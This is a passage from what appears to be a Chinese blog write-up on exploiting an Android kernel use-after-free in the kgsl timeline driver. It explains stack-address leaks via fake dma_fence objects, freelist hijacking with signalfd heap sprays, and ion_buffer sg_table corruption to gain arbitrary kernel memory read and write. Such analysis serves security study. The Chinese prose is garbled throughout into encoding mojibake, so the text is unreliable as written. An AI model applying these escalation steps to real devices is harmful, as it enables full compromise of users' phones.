<p>ä¸ºäº†èƒ½å¤Ÿè¿è¡Œè¿™æ®µä»£ç è€Œä¸æ˜¯ä¸Šé¢2ä¸­çš„å¾ªç¯ä»£ç ï¼Œéœ€è¦å°†<code>fence.cb_list</code>åˆå§‹åŒ–ä¸ºä¸€ä¸ªç©ºåˆ—è¡¨ï¼Œè¿™æ ·å®ƒçš„<code>next</code>å’Œ<code>prev</code>éƒ½æŒ‡å‘å®ƒè‡ªå·±ã€‚è¿™å¯¹äºè¢«æ¼æ´é‡Šæ”¾çš„åˆå§‹å‡<code>dma_fence</code>æ¥è¯´æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸º<code>fence</code>çš„åœ°å€ä»¥åŠ<code>fence.cb_list</code>æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥ä¸å¾—ä¸å¯¹è¿™ä¸ªç¬¬ä¸€ä¸ªå‡å¯¹è±¡å®Œå…¨é¿å…ä½¿ç”¨<code>list_replace</code>ä»£ç ã€‚ç„¶è€Œï¼Œç”±äºéšåé“¾æ¥åˆ°å®ƒçš„å‡<code>dma_fence</code>å¯¹è±¡æ˜¯åœ¨ä¸€ä¸ªå·²çŸ¥åœ°å€çš„<code>ion</code>ç¼“å†²åŒºä¸­ï¼Œç°åœ¨å¯ä»¥ä¸ºè¿™äº›å¯¹è±¡åˆ›å»ºä¸€ä¸ªç©ºçš„<code>cb_list</code>ï¼Œå°†<code>next</code>å’Œ<code>prev</code>æŒ‡é’ˆéƒ½è®¾ç½®ä¸º<code>fence.cb_list</code>å­—æ®µçš„åœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_replace</span><span class="params">(<span class="keyword">struct</span> list_head *old,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> list_head *new)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//old-&gt;next = &amp;(fence-&gt;cb_list)</span></span><br><span class="line">    new-&gt;next = old-&gt;next;</span><br><span class="line">    <span class="comment">//new-&gt;next = &amp;(fence-&gt;cb_list) =&gt; fence-&gt;cb_list.prev = &amp;cb_list</span></span><br><span class="line">    new-&gt;next-&gt;prev = new;</span><br><span class="line">    <span class="comment">//new-&gt;prev = fence-&gt;cb_list.prev =&gt; &amp;cb_list</span></span><br><span class="line">    new-&gt;prev = old-&gt;prev;</span><br><span class="line">    <span class="comment">//&amp;cb_list-&gt;next = &amp;cb_list</span></span><br><span class="line">    new-&gt;prev-&gt;next = new;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>list_replace</code>ä¹‹åï¼Œå †æ ˆå˜é‡<code>cb_list</code>çš„åœ°å€å·²ç»è¢«å†™å…¥äº†<code>fence-&gt;cb_list.prev</code>ï¼Œå®ƒåœ¨<code>ion</code>ç¼“å†²åŒºçš„æŸå¤„ã€‚ç”±äº<code>ion</code>ç¼“å†²åŒºè¢«æ˜ å°„åˆ°äº†ç”¨æˆ·ç©ºé—´ï¼Œå¯ä»¥é€šè¿‡è½®è¯¢<code>ion</code>ç¼“å†²åŒºç®€å•åœ°è¯»å–è¿™ä¸ªåœ°å€ã€‚ç”±äº<code>dma_fence_signal_locked</code>æ˜¯åœ¨å †æ ˆå˜é‡<code>temp</code>è¢«åˆ†é…ååœ¨<code>kgsl_ioctl_timeline_destroy</code>é‡Œé¢è¿è¡Œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">temp</span>;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        <span class="comment">//cb_list, is a stack variable allocated inside `dma_fence_signal_locked`</span></span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†<code>cb_list</code>çš„åœ°å€ï¼Œå°±å¯ä»¥è®¡ç®—<code>temp</code>çš„åœ°å€ï¼Œï¼ˆå®ƒä¸<code>cb_list</code>çš„åœ°å€æœ‰ä¸€ä¸ªå›ºå®šçš„åç§»ï¼‰ï¼Œæ‰€ä»¥é€šè¿‡è½®è¯¢<code>cb_list</code>çš„åœ°å€ï¼Œç„¶åç”¨å®ƒæ¥è®¡ç®—<code>temp</code>çš„åœ°å€ï¼Œå¹¶æŠŠå®ƒå†™å›<code>ion</code>ç¼“å†²åŒºä¸­ä¸€ä¸ªå‡çš„<code>kgsl_timeline_fence</code>å¯¹è±¡çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯ä»¥åœ¨çœ‹é—¨ç‹—å’¬äººä¹‹å‰é€€å‡ºå¾ªç¯ã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-5.webp" alt="Kernel-5"></p>
<h2 id="Hijacking-the-freelist"><a href="#Hijacking-the-freelist" class="headerlink" title="Hijacking the freelist"></a>Hijacking the freelist</h2><p><code>dma_fence_put</code>å°†å‡å°‘å‡å¯¹è±¡çš„<code>refcount</code>ï¼Œå¦‚æœ<code>refcount</code>è¾¾åˆ°0ï¼Œå®ƒå°†è°ƒç”¨<code>dma_fence_free</code>ï¼Œç„¶åç”¨<code>kfree_rcu</code>é‡Šæ”¾è¯¥å¯¹è±¡ã€‚ç°åœ¨å‡è®¾å‡å¯¹è±¡å°†è¢«<code>kfree_rcu</code>é‡Šæ”¾ã€‚é€šè¿‡ç”¨å¦ä¸€ä¸ªå¯¹è±¡å†æ¬¡æ›¿æ¢è¿™ä¸ªå‡å¯¹è±¡ï¼Œå°±å¯ä»¥å¾—åˆ°å¯¹åŒä¸€ä¸ªå¯¹è±¡çš„ä¸¤ä¸ªå¼•ç”¨ï¼Œå°†èƒ½å¤Ÿåœ¨ä»»ä½•æ—¶å€™ä½¿ç”¨è¿™äº›å¯¹è±¡çš„å¥æŸ„é‡Šæ”¾è¿™äº›å¯¹è±¡ã€‚ä¸€èˆ¬çš„æƒ³æ³•æ˜¯ï¼Œå½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾æ—¶ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªè‡ªç”±å—çš„<code>freelist</code>æŒ‡é’ˆå°†è¢«å†™å…¥å†…å­˜å—çš„å‰8å­—èŠ‚ã€‚å¦‚æœä»ä¸€ä¸ªå¥æŸ„ä¸­é‡Šæ”¾å¯¹è±¡ï¼Œç„¶åç”¨å¦ä¸€ä¸ªå¥æŸ„ä¿®æ”¹è¿™ä¸ªè¢«é‡Šæ”¾çš„å¯¹è±¡çš„å‰8å­—èŠ‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥åŠ«æŒ<code>freelist</code>æŒ‡é’ˆï¼Œè®©å®ƒæŒ‡å‘é€‰æ‹©çš„åœ°å€ï¼Œè¿™å°±æ˜¯ä¸‹ä¸€æ¬¡åˆ†é…å°†å‘ç”Ÿçš„åœ°æ–¹ã€‚</p>
<p>ä¸ºäº†èƒ½å¤Ÿä¿®æ”¹å¯¹è±¡åˆ†é…åçš„å‰8å­—èŠ‚ï¼Œè¿™é‡Œä½¿ç”¨â€œ<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Mitigations are attack surface too</a>â€ä¸­ä½¿ç”¨çš„<code>signalfd</code>å¯¹è±¡ã€‚<code>signalfd</code>ç³»ç»Ÿè°ƒç”¨åˆ†é…äº†ä¸€ä¸ª8å­—èŠ‚çš„å¯¹è±¡æ¥å­˜å‚¨<code>signalfd</code>æ–‡ä»¶çš„æ©ç ï¼Œè¿™ä¸ªæ©ç å¯ä»¥ç”±ç”¨æˆ·æŒ‡å®šï¼Œä½†æœ‰ä¸€äº›å°é™åˆ¶ã€‚æ‰€åˆ†é…å¯¹è±¡çš„å¯¿å‘½ä¸è¿”å›ç»™ç”¨æˆ·çš„<code>signalfd</code>æ–‡ä»¶ç›¸è”ç³»ï¼Œå¯ä»¥é€šè¿‡å…³é—­è¯¥æ–‡ä»¶è½»æ¾æ§åˆ¶ã€‚æ­¤å¤–ï¼Œè¿™ä¸ªå¯¹è±¡çš„å‰8ä¸ªå­—èŠ‚å¯ä»¥é€šè¿‡ç”¨ä¸åŒçš„æ©ç å†æ¬¡è°ƒç”¨<code>signalfd</code>æ¥æ”¹å˜ã€‚</p>
<p>ä¸ºäº†åŠ«æŒfreelistæŒ‡é’ˆï¼š</p>
<ol>
<li>è§¦å‘UAF bugï¼Œç”¨ä¸€ä¸ªé€šè¿‡<code>sendmsg</code>åˆ†é…çš„å‡çš„<code>dma_fence</code>å¯¹è±¡æ›¿æ¢å·²é‡Šæ”¾çš„å¯¹è±¡ï¼Œè¿™æ ·<code>dma_fence_free</code>å°†è¢«è°ƒç”¨ï¼Œç”¨<code>kfree_rcu</code>é‡Šæ”¾è¿™ä¸ªå‡å¯¹è±¡ã€‚</li>
<li>ç”¨<code>signalfd</code>å †å–·ï¼Œåœ¨<code>sendmsg</code>å¯¹è±¡è¢«é‡Šæ”¾åï¼Œåœ¨åŒä¸€åœ°å€åˆ†é…å¦ä¸€ä¸ªå¯¹è±¡ã€‚</li>
<li>é‡Šæ”¾<code>sendmsg</code>å¯¹è±¡ï¼Œä½¿<code>freelist</code>æŒ‡é’ˆè¢«å†™å…¥ç¬¬äºŒæ­¥ä¸­<code>signalfd</code>å¯¹è±¡çš„æ©ç ã€‚</li>
<li>ä¿®æ”¹<code>signalfd</code>å¯¹è±¡çš„æ©ç ï¼Œä½¿<code>freelist</code>æŒ‡é’ˆç°åœ¨æŒ‡å‘ä¸€ä¸ªæŒ‡å®šçš„åœ°å€ï¼Œç„¶åå†æ¬¡å †å–·ï¼Œåœ¨è¯¥åœ°å€åˆ†é…å¯¹è±¡ã€‚</li>
</ol>
<p>å¦‚æœå°†<code>freelist</code>æŒ‡é’ˆçš„åœ°å€è®¾ç½®ä¸ºæˆ‘ä»¬æ§åˆ¶çš„<code>ion</code>ç¼“å†²åŒºçš„åœ°å€ï¼Œé‚£ä¹ˆéšåçš„åˆ†é…å°†æŠŠå¯¹è±¡æ”¾å…¥<code>ion</code>ç¼“å†²åŒºï¼Œç„¶åå¯ä»¥éšæ—¶è®¿é—®å’Œä¿®æ”¹ï¼Œå³ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªæœ‰è¯»å’Œå†™æƒé™çš„åŒºåŸŸå†…ä¼ªé€ è‡ªå·±çš„å†…æ ¸å †ã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-6.webp" alt="Kernel-6"></p>
<p>è¿™ä¸ªæ–¹æ¡ˆçš„ä¸»è¦éšœç¢æ¥è‡ªäº<code>kfree_rcu</code>å’Œè¿è¡Œ<code>dma_fence_put</code>çš„<code>CPU</code>åœ¨è°ƒç”¨<code>kfree_rcu</code>åå°†æš‚æ—¶é™·å…¥ä¸€ä¸ªç¹å¿™çš„å¾ªç¯ã€‚å›é¡¾ä¸Šä¸€èŠ‚ï¼Œåœ¨èƒ½å¤Ÿé€šè¿‡å°† <code>temp</code> åˆ—è¡¨çš„åœ°å€å†™å…¥å‡çš„<code>kgsl_timeline_fence::node</code>å¯¹è±¡çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆæ¥é€€å‡ºå¾ªç¯ä¹‹å‰ï¼Œè¿™ä¸ªå¾ªç¯å°†ä¸€ç›´è¿è¡Œã€‚è¿™æ„å‘³ç€ï¼Œä¸€æ—¦è°ƒç”¨<code>kfree_rcu</code>ï¼Œ<code>dma_fence_put</code>è¢«é€€å‡ºï¼Œè¯¥å¾ªç¯å°†ç»§ç»­å¤„ç†è¿è¡Œ<code>kfree_rcu</code>çš„<code>CPU</code>ä¸Šçš„å…¶ä»–å‡<code>dma_fence</code>å¯¹è±¡ã€‚æ­£å¦‚å‰é¢æ‰€è§£é‡Šçš„ï¼Œ<code>kfree_rcu</code>ä¸ä¼šç«‹å³é‡Šæ”¾ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯å»¶è¿Ÿç§»é™¤ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œé‡Šæ”¾å°†å®é™…å‘ç”Ÿåœ¨è°ƒç”¨<code>kfree_rcu</code>çš„åŒä¸€ä¸ª<code>CPU</code>ä¸Šã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äºè¿è¡Œ<code>kfree_rcu</code>çš„<code>CPU</code>å› ä¸ºè¿è¡Œå¾ªç¯è€Œåœ¨ <code>spinlock</code> ä¸­ä¿æŒç¹å¿™ï¼Œå¯¹è±¡å‡ ä¹è‚¯å®šä¸ä¼šåœ¨åŒä¸€ä¸ª<code>CPU</code>ä¸Šè¢«é‡Šæ”¾ã€‚ç›¸åï¼Œä¸€ä¸ªä¸åŒçš„<code>CPU</code>å°†è¢«ç”¨æ¥é‡Šæ”¾è¯¥å¯¹è±¡ã€‚è¿™å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºå¯¹è±¡æ›¿æ¢çš„å¯é æ€§å–å†³äºç”¨äºé‡Šæ”¾å¯¹è±¡çš„<code>CPU</code>ã€‚å½“ä¸€ä¸ªå¯¹è±¡åœ¨<code>CPU</code>ä¸Šè¢«é‡Šæ”¾æ—¶ï¼Œå†…å­˜åˆ†é…å™¨å°†æŠŠå®ƒæ”¾åœ¨æ¯ä¸ª<code>CPU</code>çš„ç¼“å­˜ä¸­ã€‚ç´§æ¥ç€åœ¨åŒä¸€<code>CPU</code>ä¸Šè¿›è¡Œçš„åˆ†é…å°†é¦–å…ˆåœ¨<code>CPU</code>ç¼“å­˜ä¸­å¯»æ‰¾ç©ºé—²ç©ºé—´ï¼Œå¹¶ä¸”å¾ˆå¯èƒ½ä¼šæ›¿æ¢é‚£ä¸ªæ–°é‡Šæ”¾çš„å¯¹è±¡ã€‚ç„¶è€Œï¼Œå¦‚æœåˆ†é…å‘ç”Ÿåœ¨ä¸åŒçš„<code>CPU</code>ä¸Šï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½ä¼šæ›¿æ¢ä¸åŒ<code>CPU</code>ç¼“å­˜ä¸­çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸æ˜¯æ–°é‡Šæ”¾çš„å¯¹è±¡ã€‚ä¸çŸ¥é“å“ªä¸ª<code>CPU</code>è´Ÿè´£é‡Šæ”¾å¯¹è±¡ï¼Œå†åŠ ä¸Šå¯¹è±¡è¢«é‡Šæ”¾çš„æ—¶é—´ä¸ç¡®å®šï¼ˆå› ä¸º<code>kfree_rcu</code>å¼•å…¥çš„å»¶è¿Ÿï¼‰ï¼Œæ„å‘³ç€å¯èƒ½å¾ˆéš¾æ›¿æ¢å¯¹è±¡ã€‚ç„¶è€Œï¼Œåœ¨å®è·µä¸­ï¼Œç®€å•åœ°è¿è¡Œä¸€ä¸ªå¾ªç¯ï¼Œåœ¨æ¯ä¸ª<code>CPU</code>ä¸Šå–·å°„ç‰©ä½“ï¼Œå¹¶ä»¥ä¸€å®šçš„é—´éš”é‡å¤å–·å°„ï¼Œä»¥è€ƒè™‘åˆ°æ—¶é—´ä¸Šçš„ä¸ç¡®å®šæ€§ï¼ˆæˆåŠŸç‡å¤§äº70%ï¼‰ã€‚</p>
<p>æ¼æ´ä¸­ä½¿ç”¨çš„å¦ä¸€ä¸ªå°ä¿®æ”¹æ˜¯ï¼Œåœ¨<code>sendmsg</code>å¯¹è±¡è¢«é‡Šæ”¾åï¼Œç”¨å¦ä¸€è½®<code>signalfd</code>å †å–·æ¥æ›¿æ¢å®ƒä»¬ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿è¿™äº›<code>sendmsg</code>å¯¹è±¡ä¸ä¼šæ„å¤–åœ°è¢«ä¸æ§åˆ¶çš„å¯¹è±¡æ‰€æ›¿æ¢ï¼Œä»è€Œå¹²æ‰°äº†æ¼æ´çš„åˆ©ç”¨ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†æ›´å®¹æ˜“è¯†åˆ«å®é™…è¢«ç ´åçš„å¯¹è±¡ã€‚</p>
<p>ç°åœ¨å¯ä»¥åŠ«æŒ<code>freelist</code>å¹¶å°†æ–°çš„å¯¹è±¡åˆ†é…é‡å®šå‘åˆ°å¯ä»¥éšæ—¶è‡ªç”±è®¿é—®çš„<code>ion</code>ç¼“å†²åŒºï¼Œç°åœ¨éœ€è¦å°†å…¶å˜æˆä¸€ä¸ªä»»æ„çš„å†…å­˜è¯»å†™åŸè¯­ã€‚</p>
<h2 id="The-Device-Memory-Mirroring-Attack"><a href="#The-Device-Memory-Mirroring-Attack" class="headerlink" title="The Device Memory Mirroring Attack"></a>The Device Memory Mirroring Attack</h2><p>å†…æ ¸é©±åŠ¨ç»å¸¸éœ€è¦å°†å†…å­˜æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå› æ­¤ï¼Œç»å¸¸æœ‰ä¸€äº›ç»“æ„åŒ…å«æŒ‡å‘<code>page</code>ç»“æ„æˆ–<code>sg_table</code>ç»“æ„çš„æŒ‡é’ˆã€‚è¿™äº›ç»“æ„é€šå¸¸åŒ…å«æŒ‡å‘é¡µé¢çš„æŒ‡é’ˆï¼Œè¿™äº›é¡µé¢å°†è¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œä¾‹å¦‚ï¼Œå½“è°ƒç”¨<code>mmap</code>æ—¶ã€‚è¿™ä½¿å¾—å®ƒä»¬æˆä¸ºéå¸¸å¥½çš„ç ´åç›®æ ‡ã€‚ä¾‹å¦‚ï¼Œ<code>ion_buffer</code>å¯¹è±¡åœ¨æ‰€æœ‰çš„Androidè®¾å¤‡ä¸Šéƒ½å¯ç”¨ã€‚å®ƒæœ‰ä¸€ä¸ª<code>sg_table</code>ç»“æ„ï¼ŒåŒ…å«äº†å½“<code>mmap</code>è¢«ä½¿ç”¨æ—¶å°†è¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´çš„é¡µé¢çš„ä¿¡æ¯ã€‚</p>
<p>é™¤äº†å¯ä»¥å¹¿æ³›ä½¿ç”¨å’Œä»ä¸å¯ä¿¡ä»»çš„åº”ç”¨ç¨‹åºä¸­è®¿é—®å¤–ï¼Œ<code>ion_buffer</code>å¯¹è±¡è¿˜è§£å†³äº†ä¸€äº›å…¶ä»–é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä¸‹é¢çš„å†…å®¹ä¸­ï¼Œå°†ä½¿ç”¨ä¸Šé¢çš„<code>freelist</code>åŠ«æŒåŸè¯­ï¼Œåœ¨æœ‰ä»»æ„è¯»å†™æƒé™çš„<code>ion</code>ç¼“å†²åŒºå¤‡ä»½å­˜å‚¨ä¸­åˆ†é…ä¸€ä¸ª<code>ion_buffer</code>ç»“æ„ã€‚é€šè¿‡è¿™æ ·åšï¼Œå¯ä»¥éšæ„ç ´åæ‰€æœ‰è¢«åˆ†é…çš„ <code>ion_buffer</code> ç»“æ„ä¸­çš„æ•°æ®ã€‚ä¸ºäº†é¿å…æ··æ·†ï¼Œä»ç°åœ¨å¼€å§‹ï¼Œå°†ä½¿ç”¨æœ¯è¯­ â€œå‡å†…æ ¸å † â€œæ¥è¡¨ç¤ºç”¨ä½œå‡å†…æ ¸å †çš„<code>ion</code>ç¼“å†²åŒºå¤‡ä»½å­˜å‚¨ï¼Œä»¥åŠåœ¨å‡å†…æ ¸å †ä¸­åˆ†é…çš„ç”¨ä½œç ´åç›®æ ‡çš„ç»“æ„çš„<code>ion_buffer</code>ã€‚</p>
<p>è¿™é‡Œçš„æ€»ä½“æƒ³æ³•æ˜¯ï¼Œé€šè¿‡åœ¨å‡çš„å†…æ ¸å †ä¸­åˆ†é…<code>ion_buffer</code>ç»“æ„ï¼Œå°†èƒ½å¤Ÿä¿®æ”¹<code>ion_buffer</code>ç»“æ„ï¼Œç”¨å—æ§æ•°æ®æ›¿æ¢å…¶<code>sg_table</code>ã€‚<code>sg_table</code>ç»“æ„åŒ…å«ä¸€ä¸ª<code>scatterlist</code>ç»“æ„ï¼Œè¡¨ç¤ºæ”¯æŒ<code>ion_buffer</code>ç»“æ„çš„é¡µé¢é›†åˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sg_table</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> *<span class="title">sgl</span>;</span>    <span class="comment">/* the list */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nents;     <span class="comment">/* number of mapped entries */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> orig_nents;    <span class="comment">/* original size of list */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>   page_link;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    length;</span><br><span class="line">    <span class="type">dma_addr_t</span>  dma_address;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    dma_length;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>scatterlist</code>ä¸­çš„<code>page_link</code>å­—æ®µæ˜¯ä¸€ä¸ªé¡µé¢æŒ‡é’ˆçš„ç¼–ç å½¢å¼ï¼Œè¡¨æ˜<code>ion_buffer</code>ç»“æ„çš„å¤‡ä»½å­˜å‚¨æ‰€åœ¨çš„å®é™…é¡µé¢ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> page *<span class="title function_">sg_page</span><span class="params">(<span class="keyword">struct</span> scatterlist *sg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SG</span></span><br><span class="line">    BUG_ON(sg_is_chain(sg));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *)((sg)-&gt;page_link &amp; ~(SG_CHAIN | SG_END));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“<code>mmap</code>è¢«è°ƒç”¨æ—¶ï¼Œç”±<code>page_link</code>ç¼–ç çš„é¡µé¢å°†è¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ion_heap_map_user</span><span class="params">(<span class="keyword">struct</span> ion_heap *heap, <span class="keyword">struct</span> ion_buffer *buffer,</span></span><br><span class="line"><span class="params">              <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sg_table</span> *<span class="title">table</span> =</span> buffer-&gt;sg_table;</span><br><span class="line">    ...</span><br><span class="line">    for_each_sg(table-&gt;sgl, sg, table-&gt;nents, i) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> sg_page(sg);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//Maps pages to user space</span></span><br><span class="line">        ret = remap_pfn_range(vma, addr, page_to_pfn(page), len,</span><br><span class="line">                      vma-&gt;vm_page_prot);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äº <code>page</code> æŒ‡é’ˆåªæ˜¯é¡µé¢ç‰©ç†åœ°å€çš„é€»è¾‘ç§»ä½ï¼Œç„¶åæ˜¯ä¸€ä¸ªæ’å®šçš„çº¿æ€§åç§»ï¼ˆè§<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/memory.h#L285"><code>phys_to_page</code></a>çš„å®šä¹‰ï¼‰ï¼Œèƒ½å¤Ÿæ§åˆ¶<code>page_link</code>å°±å¯ä»¥æŠŠä¸€ä¸ªä»»æ„çš„é¡µé¢æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚å¯¹äºè®¸å¤šè®¾å¤‡æ¥è¯´ï¼Œè¿™å°±è¶³ä»¥å®ç°ä»»æ„çš„å†…æ ¸å†…å­˜è¯»å†™ï¼Œå› ä¸ºå†…æ ¸æ˜ åƒæ˜¯åœ¨ä¸€ä¸ªå›ºå®šçš„ç‰©ç†åœ°å€ä¸Šæ˜ å°„çš„ï¼ˆ<code>KASLR</code>éšæœºåŒ–äº†è¿™ä¸ªå›ºå®šç‰©ç†åœ°å€çš„è™šæ‹Ÿåœ°å€åç§»ï¼‰ï¼Œæ‰€ä»¥åœ¨å¤„ç†ç‰©ç†åœ°å€çš„æ—¶å€™ä¸éœ€è¦æ‹…å¿ƒ<code>KASLR</code>ã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-7.webp" alt="Kernel-7"></p>
<p>ç„¶è€Œï¼Œä¸‰æ˜Ÿè®¾å¤‡ä»¥ä¸åŒçš„æ–¹å¼è¿›è¡Œ<code>KASLR</code>ã€‚å†…æ ¸é•œåƒçš„ç‰©ç†åœ°å€ä¸æ˜¯æ˜ å°„åˆ°ä¸€ä¸ªå›ºå®šçš„ç‰©ç†åœ°å€ï¼Œè€Œæ˜¯éšæœºåŒ–çš„ï¼ˆä¸¥æ ¼æ¥è¯´ï¼Œæ˜¯å†…æ ¸è®¤ä¸ºçš„ä¸­é—´ç‰©ç†åœ°å€ï¼Œè¿™ä¸æ˜¯çœŸæ­£çš„ç‰©ç†åœ°å€ï¼Œè€Œæ˜¯ç”±ç®¡ç†ç¨‹åºç»™å‡ºçš„è™šæ‹Ÿåœ°å€ï¼‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬çš„æ¡ˆä¾‹ä¸­ï¼Œä»ç„¶éœ€è¦æ³„éœ²ä¸€ä¸ªåœ°å€æ¥æ‰“è´¥<code>KASLR</code>ã€‚ç„¶è€Œï¼Œæœ‰äº†å‡çš„å†…æ ¸å †ï¼Œè¿™å°±ç›¸å½“å®¹æ˜“å®ç°äº†ã€‚ä¸€ä¸ª<code>ion_buffer</code>å¯¹è±¡åŒ…å«ä¸€ä¸ªæŒ‡å‘<code>ion_heap</code>çš„æŒ‡é’ˆï¼Œå®ƒè´Ÿè´£ä¸º<code>ion_buffer</code>åˆ†é…åå¤‡å­˜å‚¨ã€‚</p>
